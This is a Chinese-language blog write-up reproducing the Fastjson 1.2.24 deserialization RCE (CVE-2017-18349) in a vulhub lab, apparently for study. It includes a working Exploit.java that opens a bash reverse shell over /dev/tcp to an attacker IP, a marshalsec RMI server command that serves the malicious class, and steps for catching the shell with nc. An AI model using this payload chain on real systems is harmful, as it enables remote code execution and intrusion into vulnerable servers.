---
title: CVE-2017-18349
date: 2023-02-01 14:32:57
categories: 漏洞复现
summary: fastjson1.2.24rce复现
tags:
  - 漏洞复现
  - Java
---

# CVE-2017-18349 FastJson 1.2.24 反序列化漏洞RCE

## 0x01漏洞原理

~~~
fastjson在解析json对象时，会使用autoType实例化某一个具体的类，并调用set/get方法访问属性。
漏洞出现在Fastjson autoType处理json对象时，没有对@type字段进行完整的安全性验证，我们可以传入危险的类并调用危险类连接远程RMI服务器，通过恶意类执行恶意代码，进而实现远程代码执行漏洞
影响版本为fastjson < 1.2.25
~~~

## 0x02 漏洞环境搭建

这里用vulhub靶场的docker镜像进行，记得把java版本换成1.8.0_20
更换java版本：

~~~
curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz
tar zxvf jdk-8u20-linux-x64.tar.gz
rm -rf /usr/bin/java*
ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
javac -version
java -version
~~~

然后用docker容器启动fastjson靶场

![](/images/1.png)

用burp抓包放到Repeater模块进行测试

![](/images/2.png)



先用ldap协议向第三方dnslog发送数据看看会不会有回显

![](/images/3.png)

可以看到第三方dnslog收到回显

下面就让我们来通过github上的https://github.com/mbechler/marshalsec.git 来构建一个RMI服务，然后再在本地开启一个web服务构造一个poc从而实现对fastjson实现RCE，话不多说，开干。

先下载marshalsec

~~~
git clone https://github.com/mbechler/marshalsec.git
~~~

然后下载maven并编译marshalsec生成jar

~~~
apt-get install maven
mvn clean package -DskipTests
~~~

![](/images/4.png)

mvn编译成功



下面构建exp攻击脚本Exploit.java

```
public class Exploit {
	public Exploit(){
		 try{
            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/192.168.52.136/6666 0>&1");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
```

然后进行javac  Exploit.java编译得到Exploit.class文件

在exp攻击脚本目录下开启一个web服务

![](/images/5.png)

开启一个RMI服务,监听8888端口

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.52.136:8000/#Exploit" 8888
```

![](/images/6.png)

用nc开启监听6666端口

![](/images/7.png)

burp构建发包请求

![](/images/8.png)

RMI服务器收到请求

![](/images/9.png)

通过exp脚本反弹给nc一个shell

![](/images/10.png)
